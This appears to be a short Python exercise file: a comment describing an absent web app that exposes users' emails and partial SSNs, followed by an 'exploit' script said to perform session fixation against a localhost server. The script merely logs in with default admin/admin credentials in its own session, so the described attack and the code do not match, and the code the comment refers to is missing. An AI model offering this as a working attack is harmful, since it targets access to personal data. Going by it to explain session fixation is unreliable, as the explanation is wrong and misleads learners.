
#
#The code above is a simple web application that has a single route. The route is /info and it is a GET request. The function info() is called when the route is accessed. The function info() returns a page with the username, email, and last 4 digits of the SSN. The username, email, and SSN are stored in the session variable.
#
#The code above is vulnerable to a session fixation attack.
#



import requests


def exploit(url):
    # create a new session
    s = requests.Session()

    # GET request to /info
    r = s.get(url + '/info')

    # extract the session ID from the response
    session_id = r.cookies['session_id']

    # POST request to /login with the session ID and credentials
    data = {'session_id': session_id, 'username': 'admin', 'password': 'admin'}
    s.post(url + '/login', data=data)

    # GET request to /info
    r = s.get(url + '/info')

    # print the response
    print(r.text)


if __name__ == '__main__':
    url = 'http://localhost:5000'
    exploit(url)
